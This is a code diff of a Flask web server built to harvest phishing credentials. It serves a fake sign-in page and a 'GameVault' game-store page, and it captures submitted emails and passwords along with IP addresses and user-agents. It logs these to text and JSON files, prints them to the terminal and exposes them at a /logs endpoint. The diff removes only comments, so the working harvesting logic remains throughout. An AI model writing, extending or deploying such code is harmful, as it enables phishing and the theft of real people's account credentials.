@@ -11,13 +11,11 @@ LOG_FILE_TXT = os.path.join(BASE_DIR, "captured_credentials.log")
 
 
 def save_credential(entry: dict):
-    # Save to plain text file for quick viewing
     with open(LOG_FILE_TXT, "a", encoding="utf-8") as f:
         f.write(
             f"[{entry['timestamp']}] IP: {entry['ip']} | Email: {entry['email']} | Password: {entry['password']} | User-Agent: {entry['user_agent']}\n"
         )
 
-    # Save in structured JSON format
     history = []
     if os.path.exists(LOG_FILE_JSON):
         try:
@@ -41,7 +39,6 @@ def add_cors_headers(response):
 
 @app.route("/", methods=["GET"])
 def index():
-    """Serves the sign-in page (index.html)."""
     return send_from_directory(BASE_DIR, "index.html")
 
 
@@ -49,18 +46,15 @@ def index():
 @app.route("/store.html", methods=["GET"])
 @app.route("/shop", methods=["GET"])
 def store():
-    """Serves the GameVault game store (store.html)."""
     return send_from_directory(BASE_DIR, "store.html")
 
 
 @app.route("/submit", methods=["POST", "OPTIONS"])
 @app.route("/login", methods=["POST", "OPTIONS"])
 def handle_submit():
-    """Captures credentials submitted via JSON fetch or standard form."""
     if request.method == "OPTIONS":
         return jsonify({"status": "ok"}), 200
 
-    # Support both JSON and x-www-form-urlencoded payloads
     data = request.get_json(silent=True) or request.form.to_dict() or {}
 
     email = data.get("email") or data.get("username") or data.get("user") or "N/A"
@@ -78,10 +72,8 @@ def handle_submit():
         "raw_payload": data,
     }
 
-    # Save record to local storage
     save_credential(entry)
 
-    # Visual terminal banner for observation and evidence logging
     print("\n" + "=" * 65)
     print("CREDENTIALS:")
     print(f"Timestamp:    {timestamp}")
@@ -102,7 +94,6 @@ def handle_submit():
 
 @app.route("/logs", methods=["GET"])
 def view_logs():
-    """Auxiliary endpoint to view captured credentials in the browser."""
     if not os.path.exists(LOG_FILE_JSON):
         return jsonify({"message": "No credentials captured yet.", "count": 0, "logs": []}), 200
 
